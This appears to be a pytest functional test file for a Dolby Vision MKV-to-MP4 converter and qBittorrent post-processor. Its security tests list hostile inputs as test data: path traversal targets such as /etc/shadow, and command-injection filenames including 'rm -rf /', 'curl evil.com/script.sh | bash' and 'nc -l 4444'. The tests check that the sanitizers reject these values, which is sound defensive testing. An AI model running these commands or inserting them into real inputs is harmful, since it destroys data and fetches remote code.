"""
Functional tests that test real behavior with minimal mocking
"""

import json
import subprocess
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from play_dv_on_windows import convert, qbt_post_process


class TestRealFileValidation:
    """Test file validation with real filesystem operations"""

    def test_validate_file_path_with_real_files(self):
        """Test validation with actual file system operations using real MKV file"""
        # Use the real Dolby Vision test file
        valid_mkv = Path(__file__).parent / "data" / "DV8_TEST_with_audio_subs.mkv"
        if not valid_mkv.exists():
            valid_mkv = Path(__file__).parent / "data" / "DV8_TEST_with_subs.mkv"

        if not valid_mkv.exists():
            pytest.skip("Real test MKV file not found")

        # This should work because the file is under project root
        result = convert.validate_file_path(str(valid_mkv))
        assert result == valid_mkv.resolve()
        assert result.suffix == ".mkv"

        # Test with invalid extension in current directory
        invalid_file = Path.cwd() / "functional_test.mp4"
        invalid_file.write_bytes(b"content")

        try:
            with pytest.raises(ValueError, match="Invalid file type"):
                convert.validate_file_path(str(invalid_file))
        finally:
            invalid_file.unlink()

        # Test with non-existent file
        with pytest.raises(ValueError, match="Cannot access file"):
            convert.validate_file_path(str(Path.cwd() / "nonexistent.mkv"))

    def test_safe_filename_with_real_examples(self):
        """Test filename sanitization with real problematic names"""
        test_cases = [
            ("Movie (2024) [4K].mkv", "Movie 2024 4K.mkv"),
            ("../../../etc/passwd", "etcpasswd"),
            ('file<>:"|?*.mkv', "file.mkv"),
            ("", "subtitle"),
            ("a" * 300, "a" * 200),  # Length limit
            ("  .  ", "subtitle"),  # Edge case
        ]

        for input_name, expected_pattern in test_cases:
            result = convert.safe_filename(input_name)
            assert len(result) > 0
            assert len(result) <= 200
            assert not any(char in result for char in r'\/*?:"<>|')


class TestRealStreamAnalysis:
    """Test stream analysis with real JSON data"""

    def test_select_streams_with_real_metadata(self):
        """Test stream selection with realistic FFprobe output"""
        # Real-world FFprobe output structure
        realistic_streams = {
            "streams": [
                {
                    "index": 0,
                    "codec_name": "hevc",
                    "codec_type": "video",
                    "width": 3840,
                    "height": 2160,
                    "color_transfer": "smpte2084",
                    "side_data_list": [{"side_data_type": "DOVI configuration record"}],
                },
                {
                    "index": 1,
                    "codec_name": "eac3",
                    "codec_type": "audio",
                    "tags": {"language": "eng", "title": "English 5.1"},
                },
                {
                    "index": 2,
                    "codec_name": "ac3",
                    "codec_type": "audio",
                    "tags": {"language": "spa", "title": "Spanish"},
                },
                {
                    "index": 3,
                    "codec_name": "subrip",
                    "codec_type": "subtitle",
                    "tags": {"language": "eng", "title": "English SDH"},
                },
                {
                    "index": 4,
                    "codec_name": "subrip",
                    "codec_type": "subtitle",
                    "tags": {"language": "eng", "title": "English Forced"},
                },
            ]
        }

        (
            video_idx,
            audio_streams,
            sub_streams,
            video_info,
            audio_streams_info,
        ) = convert.select_streams(realistic_streams)

        # Verify correct selection
        assert video_idx == 0
        assert len(audio_streams) == 2  # All audio streams included
        assert audio_streams[0]["index"] == 1  # English
        assert audio_streams[1]["index"] == 2  # Spanish
        assert len(sub_streams) == 2  # Both English subtitle streams
        assert video_info["codec_name"] == "hevc"
        assert video_info["width"] == 3840
        assert video_info["height"] == 2160

        # Verify subtitle stream details
        sub_titles = [s["tags"]["title"] for s in sub_streams]
        assert "English SDH" in sub_titles
        assert "English Forced" in sub_titles


class TestRealCommandConstruction:
    """Test actual command construction without mocking subprocess"""

    def test_ffmpeg_command_construction(self):
        """Test that FFmpeg commands are constructed correctly"""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)

            input_file = temp_path / "input.mkv"
            output_file = temp_path / "output.mp4"
            input_file.write_bytes(b"fake content")

            # Mock subprocess.Popen but capture the actual command
            captured_command = []

            def capture_command(cmd, **kwargs):
                captured_command.extend(cmd)
                mock_process = MagicMock()
                mock_process.stdout = []
                mock_process.returncode = 0
                return mock_process

            with patch("subprocess.Popen", side_effect=capture_command):
                # Test with realistic parameters
                sub_streams = [
                    {"index": 3, "tags": {"title": "English SDH"}},
                    {"index": 4, "tags": {"title": "English Forced"}},
                ]

                convert.remux_to_mp4(
                    "/usr/bin/ffmpeg",
                    input_file,
                    output_file,
                    video_idx=0,
                    audio_streams=[{"index": 1, "codec_name": "eac3"}],
                    sub_streams=sub_streams,
                    video_info={"codec_name": "hevc"},
                )

                # Verify command structure
                assert "/usr/bin/ffmpeg" in captured_command
                assert "-i" in captured_command
                assert str(input_file) in captured_command
                assert str(output_file) in captured_command

                # Verify stream mapping
                assert "-map" in captured_command
                assert "0:0" in captured_command  # Video stream
                assert "0:1" in captured_command  # Audio stream
                assert "0:3" in captured_command  # Subtitle stream 1
                assert "0:4" in captured_command  # Subtitle stream 2

                # Verify codec settings
                assert "-c:v" in captured_command
                assert "copy" in captured_command
                assert "-c:a" in captured_command
                assert "-c:s" in captured_command
                assert "mov_text" in captured_command

                # Verify metadata preservation
                assert "-map_metadata" in captured_command
                assert "-movflags" in captured_command
                assert "+faststart" in captured_command


class TestRealConfigurationHandling:
    """Test configuration with real file operations"""

    def test_config_manager_with_real_files(self):
        """Test configuration loading with actual files"""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)

            # Create test configuration files
            default_config = temp_path / "default.json"
            local_config = temp_path / "local.json"
            env_file = temp_path / ".env"

            # Write real configuration data
            default_config.write_text(
                json.dumps(
                    {
                        "qbittorrent": {
                            "host": "localhost",
                            "port": 8080,
                            "username": "admin",
                            "password": None,
                        },
                        "processing": {"parallel_episodes": 2},
                    }
                )
            )

            local_config.write_text(
                json.dumps({"processing": {"parallel_episodes": 4}})
            )

            env_file.write_text(
                """
QBT_PASSWORD=secret123
QBT_HOST=remote.server.com
"""
            )

            # Test actual config loading
            config_manager = qbt_post_process.ConfigManager(
                config_file=str(local_config), env_file=str(env_file)
            )

            # Verify configuration merging worked correctly
            assert config_manager.config["qbittorrent"]["host"] == "remote.server.com"
            assert config_manager.config["qbittorrent"]["password"] == "secret123"
            assert config_manager.config["processing"]["parallel_episodes"] == 4

            # Test configuration validation
            # This should fail because we don't have valid paths
            validation_result = config_manager.validate_config()
            # The validation might fail due to path creation, but config structure
            # should be valid
            assert isinstance(validation_result, bool)


class TestRealSecurityValidation:
    """Test security features with real attack scenarios"""

    def test_path_traversal_prevention(self):
        """Test that path traversal attacks are actually prevented"""
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "file:///etc/passwd",
            "\\\\server\\share\\file.mkv",
        ]

        for dangerous_path in dangerous_paths:
            with pytest.raises((ValueError, FileNotFoundError)):
                convert.validate_file_path(dangerous_path)

    def test_filename_injection_prevention(self):
        """Test that filename injection is prevented"""
        dangerous_names = [
            "file.mkv; rm -rf /",
            "file.mkv && curl evil.com/script.sh | bash",
            "file.mkv`whoami`",
            "file.mkv$(cat /etc/passwd)",
            "|nc -l 4444",
            "file.mkv\nrm -rf /",
        ]

        for dangerous_name in dangerous_names:
            safe_name = convert.safe_filename(dangerous_name)
            # Should not contain dangerous characters
            assert ";" not in safe_name
            assert "&" not in safe_name
            assert "`" not in safe_name
            assert "$" not in safe_name
            assert "|" not in safe_name
            assert "\n" not in safe_name

    def test_torrent_hash_validation(self):
        """Test that torrent hash validation works correctly"""
        valid_hashes = [
            "1234567890abcdef1234567890abcdef12345678",
            "ABCDEF1234567890abcdef1234567890ABCDEF12",
        ]

        invalid_hashes = [
            "short",
            "1234567890abcdef1234567890abcdef123456789",  # Too long
            "1234567890abcdef1234567890abcdef1234567g",  # Invalid character
            "",
            None,
            "SELECT * FROM torrents",  # SQL injection attempt
        ]

        # Mock a config for QBittorrent API
        config = {
            "qbittorrent": {
                "host": "localhost",
                "port": 8080,
                "username": "admin",
                "password": "test",
            }
        }

        with patch("requests.Session"):
            api = qbt_post_process.QBittorrentAPI(config)

            # Test valid hashes
            for valid_hash in valid_hashes:
                assert api._validate_torrent_hash(valid_hash) is True

            # Test invalid hashes
            for invalid_hash in invalid_hashes:
                assert api._validate_torrent_hash(invalid_hash) is False


class TestRealErrorHandling:
    """Test error handling with real error conditions"""

    def test_ffmpeg_timeout_handling(self):
        """Test that FFmpeg timeouts are handled correctly"""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            test_file = temp_path / "test.mkv"
            test_file.write_bytes(b"fake content")

            # Mock subprocess to timeout
            with patch("subprocess.run") as mock_run:
                mock_run.side_effect = subprocess.TimeoutExpired("ffprobe", 60)

                with pytest.raises(subprocess.TimeoutExpired):
                    convert.analyze_streams("/usr/bin/ffprobe", test_file)

    def test_disk_space_checking(self):
        """Test that disk space checking works with real values"""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)

            # Create a test file
            test_file = temp_path / "test.mkv"
            test_file.write_bytes(b"fake content" * 1000)

            config = {
                "paths": {"output_dir": str(temp_path)},
                "processing": {
                    "parallel_episodes": 1,
                    "use_temp_dir": False,
                    "temp_dir": None,
                },
            }

            processor = qbt_post_process.FileProcessor(config, MagicMock())

            # This should work with a small file
            result = processor._check_disk_space(test_file, temp_path)
            assert isinstance(result, bool)
            # Should have enough space for small test file
            assert result is True
